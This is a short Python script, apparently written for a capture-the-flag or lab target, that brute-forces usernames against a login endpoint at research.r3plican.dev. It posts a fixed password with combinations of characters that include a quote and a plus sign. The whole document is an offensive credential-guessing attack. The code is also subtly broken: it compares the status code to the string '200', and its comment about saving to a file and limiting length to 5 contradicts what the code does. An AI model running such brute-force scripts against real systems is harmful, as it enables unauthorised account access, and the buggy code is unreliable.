import itertools
import requests

possible_char = ['g', 'r', 't', 'x', 'y', "'", '+', '.']
password = "replicanx"

def send_combinations(max_length=None):
    if max_length is None:
        max_length = len(possible_char)
    
    for length in range(1, max_length + 1):
        for combo in itertools.combinations(possible_char, length):
            r = requests.post("http://research.r3plican.dev:1336/api/login", data={
                "password": password,
                "username": combo
            })
            if r.status_code == "200":
                print("username :", combo)
                break

            print(f"Trying username: {combo} | gets status: {r.status_code}")
            print(r.text)

# Save to file (limited to length 5 to avoid huge files)
send_combinations(max_length=20)